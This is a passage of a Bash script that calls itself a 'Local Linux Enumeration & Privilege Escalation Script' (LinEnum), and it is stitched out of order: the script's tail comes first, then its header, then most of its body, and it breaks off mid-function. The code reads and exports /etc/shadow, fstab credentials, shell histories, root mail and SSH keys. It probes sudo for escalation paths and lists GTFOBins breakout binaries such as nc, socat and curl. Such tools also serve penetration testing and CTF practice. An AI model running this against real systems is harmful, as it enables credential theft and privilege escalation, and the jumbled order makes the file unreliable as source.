  mkdir $format/plan_files/ 2>/dev/null
  for i in $bsdusrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

#are there any .rhosts files accessible - these may allow us to login as another user etc.
rhostsusr=`find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$rhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostsusr" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

bsdrhostsusr=`find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$bsdrhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$bsdrhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdrhostsusr" ]; then
  mkdir $format/rhosts 2>/dev/null
  for i in $bsdrhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

rhostssys=`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostssys" ]; then
  echo -e "\e[00;33m[+] Hosts.equiv file and contents: \e[00m\n$rhostssys" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostssys" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostssys; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

#list nfs shares/permisisons etc.
nfsexports=`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;31m[-] NFS config details: \e[00m\n$nfsexports" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$nfsexports" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/exports $format/etc-export/exports 2>/dev/null
fi

if [ "$thorough" = "1" ]; then
  #phackt
  #displaying /etc/fstab
  fstab=`cat /etc/fstab 2>/dev/null`
  if [ "$fstab" ]; then
    echo -e "\e[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems\e[00m"
    echo -e "$fstab"
    echo -e "\n"
  fi
fi

#looking for credentials in /etc/fstab
fstab=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$fstab" ]; then
  echo -e "\e[00;33m[+] Looks like there are credentials in /etc/fstab!\e[00m\n$fstab"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fstab" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

fstabcred=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$fstabcred" ]; then
    echo -e "\e[00;33m[+] /etc/fstab contains a credentials file!\e[00m\n$fstabcred" 
    echo -e "\n"
fi

if [ "$export" ] && [ "$fstabcred" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.conf files as no keyword was entered\n" 
  else
    confkey=`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$confkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$confkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .conf files" 
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$confkey" ]; then
	  confkeyfile=`find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/config_files/ 2>/dev/null
      for i in $confkeyfile; do cp --parents $i $format/keyword_file_matches/config_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.php files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.php files as no keyword was entered\n" 
  else
    phpkey=`find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$phpkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels - output format filepath:identified line number where keyword appears):\e[00m\n$phpkey" 
      echo -e "\n" 
     else 
  echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels):\e[00m" 
  echo -e "'$keyword' not found in any .php files" 
  echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$phpkey" ]; then
    phpkeyfile=`find / -maxdepth 10 -name *.php -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/php_files/ 2>/dev/null
      for i in $phpkeyfile; do cp --parents $i $format/keyword_file_matches/php_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.log files as no keyword was entered\n" 
  else
    logkey=`find / -maxdepth 4 -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$logkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$logkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .log files"
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$logkey" ]; then
      logkeyfile=`find / -maxdepth 4 -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
	  mkdir --parents $format/keyword_file_matches/log_files/ 2>/dev/null
      for i in $logkeyfile; do cp --parents $i $format/keyword_file_matches/log_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.ini files as no keyword was entered\n" 
  else
    inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$inikey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$inikey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .ini files" 
	echo -e "\n"
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$inikey" ]; then
	  inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/ini_files/ 2>/dev/null
      for i in $inikey; do cp --parents $i $format/keyword_file_matches/ini_files/ ; done 2>/dev/null
  fi
fi

#quick extract of .conf files from /etc - only 1 level
allconf=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$allconf" ]; then
  echo -e "\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m\n$allconf" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$allconf" ]; then
  mkdir $format/conf-files/ 2>/dev/null
  for i in $allconf; do cp --parents $i $format/conf-files/; done 2>/dev/null
fi

#extract any user history files that are accessible
usrhist=`ls -la ~/.*_history 2>/dev/null`
if [ "$usrhist" ]; then
  echo -e "\e[00;31m[-] Current user's history files:\e[00m\n$usrhist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrhist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  for i in $usrhist; do cp --parents $i $format/history_files/; done 2>/dev/null
fi

#can we read roots *_history files - could be passwords stored etc.
roothist=`ls -la /root/.*_history 2>/dev/null`
if [ "$roothist" ]; then
  echo -e "\e[00;33m[+] Root's history files are accessible!\e[00m\n$roothist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$roothist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  cp $roothist $format/history_files/ 2>/dev/null
fi

#all accessible .bash_history files in /home
checkbashhist=`find /home -name .bash_history -print -exec cat {} 2>/dev/null \;`
if [ "$checkbashhist" ]; then
  echo -e "\e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m\n$checkbashhist"
  echo -e "\n"
fi

#any .bak files that may be of interest
bakfiles=`find / -name *.bak -type f 2</dev/null`
if [ "$bakfiles" ]; then
  echo -e "\e[00;31m[-] Location and Permissions (if accessible) of .bak file(s):\e[00m"
  for bak in `echo $bakfiles`; do ls -la $bak;done
  echo -e "\n"
fi

#is there any mail accessible
readmail=`ls -la /var/mail 2>/dev/null`
if [ "$readmail" ]; then
  echo -e "\e[00;31m[-] Any interesting mail in /var/mail:\e[00m\n$readmail" 
  echo -e "\n"
fi

#can we read roots mail
readmailroot=`head /var/mail/root 2>/dev/null`
if [ "$readmailroot" ]; then
  echo -e "\e[00;33m[+] We can read /var/mail/root! (snippet below)\e[00m\n$readmailroot" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmailroot" ]; then
  mkdir $format/mail-from-root/ 2>/dev/null
  cp $readmailroot $format/mail-from-root/ 2>/dev/null
fi
}

docker_checks()
{

#specific checks - check to see if we're in a docker container
dockercontainer=` grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
if [ "$dockercontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a Docker container:\e[00m\n$dockercontainer" 
  echo -e "\n"
fi

#specific checks - check to see if we're a docker host
dockerhost=`docker --version 2>/dev/null; docker ps -a 2>/dev/null`
if [ "$dockerhost" ]; then
  echo -e "\e[00;33m[+] Looks like we're hosting Docker:\e[00m\n$dockerhost" 
  echo -e "\n"
fi

#specific checks - are we a member of the docker group
dockergrp=`id | grep -i docker 2>/dev/null`
if [ "$dockergrp" ]; then
  echo -e "\e[00;33m[+] We're a member of the (docker) group - could possibly misuse these rights!\e[00m\n$dockergrp" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockerfiles=`find / -name Dockerfile -exec ls -l {} 2>/dev/null \;`
if [ "$dockerfiles" ]; then
  echo -e "\e[00;31m[-] Anything juicy in the Dockerfile:\e[00m\n$dockerfiles" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockeryml=`find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;`
if [ "$dockeryml" ]; then
  echo -e "\e[00;31m[-] Anything juicy in docker-compose.yml:\e[00m\n$dockeryml" 
  echo -e "\n"
fi
}

lxc_container_checks()
{

#specific checks - are we in an lxd/lxc container
lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
if [ "$lxccontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a lxc container:\e[00m\n$lxccontainer"
  echo -e "\n"
fi

#specific checks - are we a member of the lxd group
lxdgroup=`id | grep -i lxd 2>/dev/null`
if [ "$lxdgroup" ]; then
  echo -e "\e[00;33m[+] We're a member of the (lxd) group - could possibly misuse these rights!\e[00m\n$lxdgroup"
  echo -e "\n"
fi
}

footer()
{
echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m" 
}

call_each()
{
  header
  debug_info
  system_info
  user_info
  environmental_info
  job_info
  networking_info
  services_info
  software_configs
  interesting_files
  docker_checks
  lxc_container_checks
  footer
}

while getopts "h:k:r:e:st" option; do
 case "${option}" in
    k) keyword=${OPTARG};;
    r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
    e) export=${OPTARG};;
    s) sudopass=1;;
    t) thorough=1;;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

call_each | tee -a $report 2> /dev/null
#EndOfScript#!/bin/bash
#A script to enumerate local information from a Linux host
version="version 0.982"
#@rebootuser

#help function
usage () 
{ 
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m"
echo -e "\e[00;31m#########################################################\e[00m"
echo -e "\e[00;33m# www.rebootuser.com | @rebootuser \e[00m"
echo -e "\e[00;33m# $version\e[00m\n"
echo -e "\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"

		echo "OPTIONS:"
		echo "-k	Enter keyword"
		echo "-e	Enter export location"
		echo "-s 	Supply user password for sudo checks (INSECURE)"
		echo "-t	Include thorough (lengthy) tests"
		echo "-r	Enter report name" 
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"
		
echo -e "\e[00;31m#########################################################\e[00m"		
}
header()
{
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m" 
echo -e "\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;33m# www.rebootuser.com\e[00m" 
echo -e "\e[00;33m# $version\e[00m\n" 

}

debug_info()
{
echo "[-] Debug Info" 

if [ "$keyword" ]; then 
	echo "[+] Searching for the keyword $keyword in conf, php, ini and log files" 
fi

if [ "$report" ]; then 
	echo "[+] Report name = $report" 
fi

if [ "$export" ]; then 
	echo "[+] Export location = $export" 
fi

if [ "$thorough" ]; then 
	echo "[+] Thorough tests = Enabled" 
else 
	echo -e "\e[00;33m[+] Thorough tests = Disabled\e[00m" 
fi

sleep 2

if [ "$export" ]; then
  mkdir $export 2>/dev/null
  format=$export/LinEnum-export-`date +"%d-%m-%y"`
  mkdir $format 2>/dev/null
fi

if [ "$sudopass" ]; then 
  echo -e "\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"
  read -s userpassword
  echo 
fi

who=`whoami` 2>/dev/null 
echo -e "\n" 

echo -e "\e[00;33mScan started at:"; date 
echo -e "\e[00m\n" 
}

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'

system_info()
{
echo -e "\e[00;33m### SYSTEM ##############################################\e[00m" 

#basic kernel info
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31m[-] Kernel information:\e[00m\n$unameinfo" 
  echo -e "\n" 
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31m[-] Kernel information (continued):\e[00m\n$procver" 
  echo -e "\n" 
fi

#search all *-release files for version info
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31m[-] Specific release information:\e[00m\n$release" 
  echo -e "\n" 
fi

#target hostname info
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31m[-] Hostname:\e[00m\n$hostnamed" 
  echo -e "\n" 
fi
}

user_info()
{
echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m" 

#current user details
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31m[-] Current user/group info:\e[00m\n$currusr" 
  echo -e "\n"
fi

#last logged on user information
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31m[-] Users that have previously logged onto the system:\e[00m\n$lastlogedonusrs" 
  echo -e "\n" 
fi

#who else is logged on
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31m[-] Who else is logged on:\e[00m\n$loggedonusrs" 
  echo -e "\n"
fi

#lists all id's and respective group(s)
grpinfo=`for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31m[-] Group memberships:\e[00m\n$grpinfo"
  echo -e "\n"
fi

#added by phackt - look for adm group (thanks patrick)
adm_users=$(echo -e "$grpinfo" | grep "(adm)")
if [[ ! -z $adm_users ]];
  then
    echo -e "\e[00;31m[-] It looks like we have some admin users:\e[00m\n$adm_users"
    echo -e "\n"
fi

#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33m[+] It looks like we have password hashes in /etc/passwd!\e[00m\n$hashesinpasswd" 
  echo -e "\n"
fi

#contents of /etc/passwd
readpasswd=`cat /etc/passwd 2>/dev/null`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
fi

#checks to see if the shadow file can be read
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  echo -e "\e[00;33m[+] We can read the shadow file!\e[00m\n$readshadow" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
fi

#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant
readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
if [ "$readmasterpasswd" ]; then
  echo -e "\e[00;33m[+] We can read the master.passwd file!\e[00m\n$readmasterpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmasterpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/master.passwd $format/etc-export/master.passwd 2>/dev/null
fi

#all root accounts (uid 0)
superman=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null`
if [ "$superman" ]; then
  echo -e "\e[00;31m[-] Super user account(s):\e[00m\n$superman"
  echo -e "\n"
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31m[-] Sudoers configuration (condensed):\e[00m$sudoers"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
fi

#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "\e[00;33m[+] We can sudo without supplying a password!\e[00m\n$sudoperms" 
  echo -e "\n"
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "\e[00;33m[+] We can sudo when supplying a password!\e[00m\n$sudoauth" 
        echo -e "\n"
      fi
    fi
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      if [ "$sudopermscheck" ]; then
        echo -e "\e[00;33m[-] Possible sudo pwnage!\e[00m\n$sudopermscheck" 
        echo -e "\n"
      fi
    fi
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m[+] Possible sudo pwnage!\e[00m\n$sudopwnage" 
  echo -e "\n"
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "\e[00;31m[-] Accounts that have recently used sudo:\e[00m\n$whohasbeensudo" 
  echo -e "\n"
fi

#checks to see if roots home directory is accessible
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m[+] We can read root's home directory!\e[00m\n$rthmdir" 
  echo -e "\n"
fi

#displays /home directory permissions - check if any are lax
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31m[-] Are permissions on /home directories lax:\e[00m\n$homedirperms" 
  echo -e "\n"
fi

#looks for files we can write to that don't belong to us
if [ "$thorough" = "1" ]; then
  grfilesall=`find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$grfilesall" ]; then
    echo -e "\e[00;31m[-] Files not owned by user but writable by group:\e[00m\n$grfilesall" 
    echo -e "\n"
  fi
fi

#looks for files that belong to us
if [ "$thorough" = "1" ]; then
  ourfilesall=`find / -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$ourfilesall" ]; then
    echo -e "\e[00;31m[-] Files owned by our user:\e[00m\n$ourfilesall"
    echo -e "\n"
  fi
fi

#looks for hidden files
if [ "$thorough" = "1" ]; then
  hiddenfiles=`find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$hiddenfiles" ]; then
    echo -e "\e[00;31m[-] Hidden files:\e[00m\n$hiddenfiles"
    echo -e "\n"
  fi
fi

#looks for world-reabable files within /home - depending on number of /home dirs & files, this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
wrfileshm=`find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null`
	if [ "$wrfileshm" ]; then
		echo -e "\e[00;31m[-] World-readable files within /home:\e[00m\n$wrfileshm" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wrfileshm" ]; then
		mkdir $format/wr-files/ 2>/dev/null
		for i in $wrfileshm; do cp --parents $i $format/wr-files/ ; done 2>/dev/null
	fi
fi

#lists current user's home directory contents
if [ "$thorough" = "1" ]; then
homedircontents=`ls -ahl ~ 2>/dev/null`
	if [ "$homedircontents" ] ; then
		echo -e "\e[00;31m[-] Home directory contents:\e[00m\n$homedircontents" 
		echo -e "\n" 
	fi
fi

#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
sshfiles=`find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;`
	if [ "$sshfiles" ]; then
		echo -e "\e[00;31m[-] SSH keys/host information found in the following locations:\e[00m\n$sshfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$sshfiles" ]; then
		mkdir $format/ssh-files/ 2>/dev/null
		for i in $sshfiles; do cp --parents $i $format/ssh-files/; done 2>/dev/null
	fi
fi

#is root permitted to login via ssh
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;31m[-] Root is allowed to login via SSH:\e[00m" ; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" 
  echo -e "\n"
fi
}

environmental_info()
{
echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m" 

#env information
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m[-] Environment information:\e[00m\n$envinfo" 
  echo -e "\n"
fi

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "\e[00;31m[-] SELinux seems to be present:\e[00m\n$sestatus"
  echo -e "\n"
fi

#phackt

#current path configuration
pathinfo=`echo $PATH 2>/dev/null`
if [ "$pathinfo" ]; then
  pathswriteable=`ls -ld $(echo $PATH | tr ":" " ")`
  echo -e "\e[00;31m[-] Path information:\e[00m\n$pathinfo" 
  echo -e "$pathswriteable"
  echo -e "\n"
fi

#lists available shells
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31m[-] Available shells:\e[00m\n$shellinfo" 
  echo -e "\n"
fi

#current umask value with both octal and symbolic output
umaskvalue=`umask -S 2>/dev/null & umask 2>/dev/null`
if [ "$umaskvalue" ]; then
  echo -e "\e[00;31m[-] Current umask value:\e[00m\n$umaskvalue" 
  echo -e "\n"
fi

#umask value as in /etc/login.defs
umaskdef=`grep -i "^UMASK" /etc/login.defs 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m\n$umaskdef" 
  echo -e "\n"
fi

#password policy information as stored in /etc/login.defs
logindefs=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
fi
}

job_info()
{
echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m" 

#are there any cron jobs configured
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31m[-] Cron jobs:\e[00m\n$cronjobs" 
  echo -e "\n"
fi

#can we manipulate these jobs in any way
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m[+] World-writable cron jobs and file contents:\e[00m\n$cronjobwwperms" 
  echo -e "\n"
fi

#contab contents
crontabvalue=`cat /etc/crontab 2>/dev/null`
if [ "$crontabvalue" ]; then
  echo -e "\e[00;31m[-] Crontab contents:\e[00m\n$crontabvalue" 
  echo -e "\n"
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31m[-] Anything interesting in /var/spool/cron/crontabs:\e[00m\n$crontabvar" 
  echo -e "\n"
fi

anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31m[-] Anacron jobs and associated file permissions:\e[00m\n$anacronjobs" 
  echo -e "\n"
fi

anacrontab=`ls -la /var/spool/anacron 2>/dev/null`
if [ "$anacrontab" ]; then
  echo -e "\e[00;31m[-] When were jobs last executed (/var/spool/anacron contents):\e[00m\n$anacrontab" 
  echo -e "\n"
fi

#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)
cronother=`cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
  echo -e "\e[00;31m[-] Jobs held by all users:\e[00m\n$cronother" 
  echo -e "\n"
fi

# list systemd timers
if [ "$thorough" = "1" ]; then
  # include inactive timers in thorough mode
  systemdtimers="$(systemctl list-timers --all 2>/dev/null)"
  info=""
else
  systemdtimers="$(systemctl list-timers 2>/dev/null |head -n -1 2>/dev/null)"
  # replace the info in the output with a hint towards thorough mode
  info="\e[2mEnable thorough tests to see inactive timers\e[00m"
fi
if [ "$systemdtimers" ]; then
  echo -e "\e[00;31m[-] Systemd timers:\e[00m\n$systemdtimers\n$info"
  echo -e "\n"
fi

}

networking_info()
{
echo -e "\e[00;33m### NETWORKING  ##########################################\e[00m" 

#nic information
